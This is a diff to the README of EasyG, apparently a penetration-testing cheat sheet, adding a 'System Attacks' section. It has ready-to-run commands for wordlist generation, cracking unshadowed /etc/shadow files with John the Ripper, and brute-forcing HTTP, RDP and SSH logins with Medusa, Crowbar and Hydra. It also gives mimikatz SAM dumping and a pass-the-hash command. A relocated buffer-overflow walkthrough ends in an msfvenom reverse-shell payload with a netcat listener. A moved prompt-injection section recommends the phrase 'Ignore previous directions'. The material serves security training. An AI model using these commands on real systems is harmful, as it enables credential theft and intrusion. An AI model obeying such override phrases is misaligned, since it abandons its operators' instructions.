@@ -119,9 +119,23 @@ EasyG started out as a script that I use to automate some information gathering 
   - [Insecure Windows Service permissions](#insecure-windows-service-permissions)
   - [Code injection](#code-injection)
   - [Windows persistence](#windows-persistence)
+- [System Attacks](#system-attacks)
+  - [Password Attacks](#password-attacks)
+    - [Wordlists](#wordlists)
+    - [Password Cracking](#password-cracking)
+      - [John the Ripper](#john-the-ripper)
+      - [Ophcrack](#ophcrack)
+    - [Common Network Service Attack Methods](#common-network-service-attack-methods)
+      - [Medusa, HTTP htaccess Attack](#medusa-http-htaccess-attack)
+      - [Crowbar, Remote Desktop Protocol Attack](#crowbar-remote-desktop-protocol-attack)
+      - [THC Hydra, SSH Attack](#thc-hydra-ssh-attack)
+      - [THC Hydra, HTTP POST Attack](#thc-hydra-http-post-attack)
+    - [Leveraging Password Hashes](#leveraging-password-hashes)
+      - [mimikatz](#mimikatz)
+      - [Pass-the-Hash](#pass-the-hash)
+  - [Buffer Overflow](#buffer-overflow)
 - [Artificial intelligence vulnerabilities](#artificial-intelligence-vulnerabilities)
   - [Prompt Injection](#prompt-injection)
-- [Buffer Overflow](#buffer-overflow)
 
 
 
@@ -2824,20 +2838,143 @@ Unprivileged users have the ability to change or replace the executable with arb
 - [persistence-info.github.io](https://persistence-info.github.io/)
 - [PayloadsAllTheThings/Windows - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)
 
+## System Attacks
 
-## Artificial intelligence vulnerabilities
+### <ins>Password Attacks</ins>
 
-### <ins>Prompt Injection</ins>
+[How Secure Is My Password?](https://howsecureismypassword.net/)
 
-**Prompt Injection** is when an AI that follows textual instructions (a "prompt") to complete a job gets deceived by hostile, adversarial human input to do a task that was not its original goal. To test it, inject the text `Ignore previous directions`.
+#### <ins>Wordlists</ins>
+- [SecLists](https://github.com/danielmiessler/SecLists)
+- [wordlists.assetnote.io](https://wordlists.assetnote.io/)
+- [content_discovery_all.txt](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
+- [OneListForAll](https://github.com/six2dez/OneListForAll)
+- [wordlistgen](https://github.com/ameenmaali/wordlistgen)
+- [Scavenger](https://github.com/0xDexter0us/Scavenger)
+- [cewl](https://digi.ninja/projects/cewl.php)
+  - `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`
 
-Some examples:
-- ["Exploiting GPT-3 prompts with malicious inputs that order the model to ignore its previous directions"](https://twitter.com/goodside/status/1569128808308957185)
-- ["OpenAI’s ChatGPT is susceptible to prompt injection — say the magic words, “Ignore previous directions”, and it will happily divulge to you OpenAI’s proprietary prompt"](https://twitter.com/goodside/status/1598253337400717313)
-- [Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/)
+**Brute Force Wordlists**
+
+[Crunch](https://sourceforge.net/projects/crunch-wordlist/), see [crunch | Kali Linux Tools](https://www.kali.org/tools/crunch/). 
+
+| Placeholder |  Character translation             |
+| ----------- | ---------------------------------- |
+| @           | Lower case alpha characters        |
+| ,           | Upper case alpha characters        |
+| %           | Numeric characters                 |
+| ^           | Special characters including space |
+
+Examples of usage:
+- Structure of the passwords of the target: `[Capital Letter] [2 x lower case letters] [2 x special chars] [3 x numeric]`. Run `crunch 8 8 -t ,@@^^%%%`
+- Passwords between four and six characters in length, containing only the characters 0-9 and A-F: `crunch 4 6 0123456789ABCDEF -o crunch.txt`
+- Use a pre-defined character-set with `-f` and include `mixalpha` to  include all lower and upper case letters `crunch 4 6 -f /usr/share/crunch/charset.lst mixalpha -o crunch.txt`
+
+#### <ins>Password Cracking</ins>
+
+**Tools**
+- [John the Ripper](https://www.openwall.com/john/)
+- [Hashcat](https://hashcat.net/hashcat/)
+- [Ophcrack](https://ophcrack.sourceforge.io/)
+  
+#### John the Ripper
+- Note for Linux-based systems: first use the unshadow utility to combine the passwd and shadow files from the compromised system `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`
+- `john -incremental -users:<user list> <file to crack>` pure brute force attack, you can use `-user:<username>` to target a specific user
+- `john --show crackme` display the passwords recovered
+- `john --wordlist=<custom wordlist file> -rules <file to crack>` dictionary attack, use `-wordlist` instead of `--wordlist=<custom wordlist file>` to use the john default wordlist
+- `john hash.txt --format=NT` simple attack to attack NT hashes
+- `john --rules --wordlist=<custom wordlist file> hash.txt --format=NT` using password mutation rules
+- `john --rules --wordlist=<custom wordlist file> unshadowed.txt`
+- To distribute the load and speed up the cracking process (for multi core CPUs)
+  1. Use the options `--fork=8` and `--node=1-8/16` on the first machine
+  2. Use the options `--fork=8` and `--node=9-16/16` on the first machine
+
+#### Ophcrack
+
+1. Install the tables
+2. Load a password file with `Load`
+3. Click on the `Crack` button
 
 
-## Buffer Overflow
+#### <ins>Common Network Service Attack Methods</ins>
+
+**Tools**
+- [Medusa](http://h.foofus.net/?page_id=51)
+- [Spray](https://github.com/Greenwolf/Spray)
+- [Crowbar](https://github.com/galkan/crowbar)
+- [THC Hydra](https://github.com/vanhauser-thc/thc-hydra)
+
+#### [Medusa](http://h.foofus.net/?page_id=51), HTTP htaccess Attack
+
+- `medusa -d` All the protocols medusa can interact with
+- ` medusa -h 10.11.0.5 -u admin -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/admin`
+  - `-m` htaccess-protected URL
+  - `-h` target host
+  - `-u` attack the admin user
+  - `-P` wordlist file
+  - `-M` HTTP authentication scheme
+
+#### [Crowbar](https://github.com/galkan/crowbar), Remote Desktop Protocol Attack
+
+- `crowbar --help`
+- `crowbar -b rdp -s 10.11.0.22/32 -u admin -C ~/password-file.txt -n 1`
+  - `-b` specify the protocol
+  - `-s` target server
+  - `-u` username
+  - `-c` wordlist
+  - `-n` number of threads
+
+#### [THC Hydra](https://github.com/vanhauser-thc/thc-hydra), SSH Attack
+
+- `hydra`
+- `hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1`
+  - `-l` specify the target username
+  - `-P` specify a wordlist
+  - `protocol://IP` o specify the target protocol and IP address respectively
+
+#### [THC Hydra](https://github.com/vanhauser-thc/thc-hydra), HTTP POST Attack
+
+- `hydra http-form-post -U`
+- `hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f`
+  - `-l` user name
+  - `-P` wordlist
+  - `-vV` verbose output
+  - `-f` stop the attack when the first successful result is found
+  - supply the service module name `http-form-post` and its required arguments `/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN`
+
+#### <ins>Leveraging Password Hashes</ins>
+
+**Tools**
+- [Sample password hash encoding strings](https://openwall.info/wiki/john/sample-hashes)
+- [hashID](https://psypanda.github.io/hashID/)
+  - `hashid c43ee559d69bc7f691fe2fbfe8a5ef0a`
+- [mimikatz](https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html)
+- [fgdump](http://foofus.net/goons/fizzgig/fgdump/downloads.htm)
+- [Credential Editor](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
+- [Responder.py](https://github.com/SpiderLabs/Responder)
+
+**Notes**
+- On most Linux systems, hashed passwords are stored in the `/etc/shadow` file
+- On Windows systems, hashed user passwords are stored in the Security Accounts Manager (SAM). Microsoft introduced the SYSKEY feature (Windows NT 4.0 SP3) to deter offline SAM database password attacks
+- Windows NT-based systems, up to and including Windows 2003, store two different password hashes: LAN Manager (LM) (DES based) and NT LAN Manager (NTLM), wich uses MD4 hashing
+- From Windows Vista on, the operating system disables LM by default and uses NTLM
+
+
+#### mimikatz
+1. `C:\Programs\password_attacks\mimikatz.exe`
+2. `privilege::debug` enables the SeDebugPrivilge access right required to tamper with another process
+3. `token::elevate` elevate the security token from high integrity (administrator) to SYSTEM integrity
+4. `lsadump::sam` dump the contents of the SAM database
+
+#### Pass-the-Hash
+- See ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
+- [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
+  - `pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd`
+    - `-U` specifying the user name and hash, along with the SMB share and the name of the command to execute
+
+
+### <ins>Buffer Overflow</ins>
 
 **Tools**
 - [Immunity Debugger](https://www.immunityinc.com/products/debugger/) + [mona](https://github.com/corelan/mona)
@@ -2861,7 +2998,7 @@ Some examples:
 6. [Finding the right module](#finding-the-right-module)
 7. [Generating Shellcode](#generating-shellcode)
 
-### <ins>Spiking</ins>
+#### <ins>Spiking</ins>
 
 `generic_send_tcp <IP Vulnserver> <port vulnserver> script.spk 0 0`
 
@@ -2872,7 +3009,7 @@ s_string("TRUN ");
 s_string_variable("0");
 ```
 
-### <ins>Fuzzing</ins>
+#### <ins>Fuzzing</ins>
 
 ```python
 #!/usr/bin/python
@@ -2895,7 +3032,7 @@ while True:
         sys.exit()
 ```
 
-### <ins>Finding the Offset</ins>
+#### <ins>Finding the Offset</ins>
 
 1. Get the result from: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bytes_where_server_crashed>`
 2. Modify the previous script in
@@ -2919,7 +3056,7 @@ while True:
 3. After running the script, read the value from the EIP
 4. With that value, run this script: `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q EIP_VALUE_STEP_2`
 
-### <ins>Overwriting the EIP</ins>
+#### <ins>Overwriting the EIP</ins>
 
 From the previous result, we should get the position `2003` for the start of the EIP. We can test this by sending `A * 2003` plus `B * 4` and see if `EIP = 42424242` (since `42424242` = `BBBB`).
 
@@ -2941,7 +3078,7 @@ while True:
 		sys.exit()
 ```
 
-### <ins>Finding bad characters</ins>
+#### <ins>Finding bad characters</ins>
 
 **Bad characters**
 ```python
@@ -2987,7 +3124,7 @@ while True:
    - Example: you may get a result like `... 01 02 03 B0 B0 06 07 08 ...`. As you can see, `04` and `05` are missing, so you've found a bad character.
 3. Write down every character missing
 
-### <ins>Finding the right module</ins>
+#### <ins>Finding the right module</ins>
 
 Note: `JMP ESP` will be used as the pointer to jump to the shellcode. With `nasm_shell.rb` with can get the hex equivalent to these commands.
 ```
@@ -3021,7 +3158,7 @@ On Immunity, using mona, type
    - Before launching the script, in Immunify click on `Enter expression to follow` > insert `625011af` > Click on it > press `F2` to inser a breakpoint
    - Using python3, you may need to change the value for `shellcode` in `"A" * 1996 + "\x84\xaf\x11\x50\x62\xaf\x11\x50\x62\x84"`
 
-### <ins>Generating Shellcode</ins>
+#### <ins>Generating Shellcode</ins>
 
 1. Copy the result from `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
    - Always note the payload size
@@ -3047,3 +3184,16 @@ On Immunity, using mona, type
    ```
 3. Use the command `nc -nvlp 4444`
 4. Run the script, notice the shell in netcat
+
+
+
+## Artificial intelligence vulnerabilities
+
+### <ins>Prompt Injection</ins>
+
+**Prompt Injection** is when an AI that follows textual instructions (a "prompt") to complete a job gets deceived by hostile, adversarial human input to do a task that was not its original goal. To test it, inject the text `Ignore previous directions`.
+
+Some examples:
+- ["Exploiting GPT-3 prompts with malicious inputs that order the model to ignore its previous directions"](https://twitter.com/goodside/status/1569128808308957185)
+- ["OpenAI’s ChatGPT is susceptible to prompt injection — say the magic words, “Ignore previous directions”, and it will happily divulge to you OpenAI’s proprietary prompt"](https://twitter.com/goodside/status/1598253337400717313)
+- [Exploring Prompt Injection Attacks](https://research.nccgroup.com/2022/12/05/exploring-prompt-injection-attacks/)
